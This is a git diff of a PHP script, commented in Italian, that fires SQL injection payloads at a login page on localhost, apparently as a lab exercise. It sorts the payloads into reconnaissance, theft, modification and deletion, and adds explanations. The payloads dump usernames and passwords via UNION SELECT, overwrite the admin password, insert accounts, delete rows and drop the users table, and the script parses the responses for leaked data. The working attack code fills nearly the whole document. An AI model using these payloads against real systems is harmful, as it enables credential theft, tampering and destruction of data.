@@ -4,49 +4,61 @@
 $target = "http://localhost:8080/index.php";
 
 $payloads = [
-    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --",
-    "'; UPDATE users SET password='123456' WHERE id=2; --",
-    "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123'); --",
-    "'; UPDATE users SET password=CONCAT(password, '_changed') WHERE username='user3'; --",
-    "'; DELETE FROM users WHERE username='user10'; --",
-    "' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -",
-    "' OR 1=1-- ",
-    "' OR '1'='1'-- ",
-    "'; DELETE FROM users WHERE username LIKE 'user%'; --",
-    "' OR 'a'='a' UNION SELECT 1,'admin','password'-- -",
+    // Raccogliere informazioni sulla struttura del DB o sulla sua configurazione
     "' UNION SELECT 1,version(),3-- -",
     "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -",
+
+    //Esfiltrare dati contenuti in una o più tabelle del database
+    "' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -",
+    "' OR 'a'='a' UNION SELECT 1,'admin','password'-- -",
+    "' OR 1=1-- ",
+    "' OR '1'='1'-- ",
+
+    //Modificare il contenuto del database
+    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --",
+    "'; UPDATE users SET password='123456' WHERE id=2; --",
+    "'; UPDATE users SET password=CONCAT(password, '_changed') WHERE username='user3'; --",
+    "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123'); --",
+
+    //Cancellare una o più tabelle o righe del database
+    "'; DELETE FROM users WHERE username='user10'; --",
+    "'; DELETE FROM users WHERE username LIKE 'user%'; --",
     "'; DROP TABLE users; --",
-
-
 ];
 
+//loop sui payloads
 foreach ($payloads as $payload) {
+
+    //Costruzione URL con input vulnerabile
     $username = urlencode($payload);
     $password = urlencode($payload);
     $url = "{$target}?username={$username}&password={$password}";
-
+    //Invio richiesta al server con i payload
     echo "\n[+] Testando: {$payload}\n";
     $response = @file_get_contents($url);
 
+    //Se la risposta non arriva stampa errore e passa al payload successivo
     if ($response === false) {
         echo "[-] Errore connessione\n";
         continue;
     }
 
-    // Verifica errore SQL
+    // Rilevamento errori SQL classici nella risposta
     if (strpos($response, "SQL syntax") !== false || strpos($response, "mysql_fetch_array") !== false) {
         echo "[!] Errore SQL rilevato - Possibile vulnerabilità\n";
     }
 
+    //Verifica se la risposta contiene il marcatore "ID:", quindi qualcosa è stato restituito dal DB
     if (strpos($response, "ID:") !== false) {
         // Se payload contiene "version()"
         if (strpos($payload, "version()") !== false) {
             echo "[!] VULNERABILE!\n";
 
+            //Estraggo una porzione utile della risposta e rimuovo i tag HTML per analisi più semplice
             $snippet = substr($response, strpos($response, "ID:"), 200);
             $clean_snippet = trim(strip_tags($snippet));
 
+            //Uso una regex per cercare una stringa con "Utente: <valore>" o "ID:..." contenente la versione del DB
             if (preg_match('/Utente:\s*([^\s<]+)/i', $clean_snippet, $matches)) {
                 echo "    Versione: {$matches[1]}\n";
             } elseif (preg_match('/ID:\s*\d+.*?([\d.]+)/', $clean_snippet, $matches)) {
@@ -54,7 +66,8 @@ foreach ($payloads as $payload) {
             } else {
                 echo "    Versione non trovata\n";
             }
-
+        
+        //Se è un payload con UNION SELECT, vengono analizzati dati restituiti, come nomi di colonne o user/pass
         } elseif (preg_match("/(?i)\bUNION\b\s+SELECT\b/", $payload)) {
             echo "[!] VULNERABILE!\n";
 
@@ -65,6 +78,7 @@ foreach ($payloads as $payload) {
             $lines = preg_split('/(?=ID:)/i', $clean_snippet);
             $filtered = [];
 
+            //Scarta righe HTML o script inutili per isolare solo dati interessanti (es. risultati query)
             foreach ($lines as $line) {
                 $line = trim($line);
                 // Filtra righe JS/HTML o vuote
